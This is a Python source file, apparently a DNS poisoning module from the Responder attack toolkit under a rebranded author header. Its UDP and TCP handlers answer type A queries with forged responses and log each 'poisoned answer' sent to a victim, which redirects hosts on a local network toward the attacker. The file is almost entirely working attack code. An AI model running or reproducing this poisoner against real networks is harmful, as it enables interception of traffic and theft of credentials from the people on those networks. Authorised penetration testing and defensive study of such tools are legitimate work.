#!/usr/bin/env python
"""
@author    : ALIF FUSOBAR
@nickname  : Xcod3bughunt3r
@license   : MIT FUCK LICENSE
@contact   : master@itsecurity.id
"""

from utils import *
from packets import DNS_Ans
if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

def ParseDNSType(data):
	QueryTypeClass = data[len(data)-4:]

	# If Type A, Class IN, then answer.
	return QueryTypeClass == "\x00\x01\x00\x01"



class DNS(BaseRequestHandler):
	def handle(self):
		# Break out if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None

		try:
			data, soc = self.request
			if ParseDNSType(NetworkRecvBufferPython2or3(data)) and settings.Config.AnalyzeMode == False:
				buff = DNS_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				print(color("[*] [DNS] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))

		except Exception:
			pass

# DNS Server TCP Class
class DNSTCP(BaseRequestHandler):
	def handle(self):
		# Break out if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None
	
		try:
			data = self.request.recv(1024)
			if ParseDNSType(NetworkRecvBufferPython2or3(data)) and settings.Config.AnalyzeMode is False:
				buff = DNS_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				print(color("[*] [DNS-TCP] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))

		except Exception:
			pass
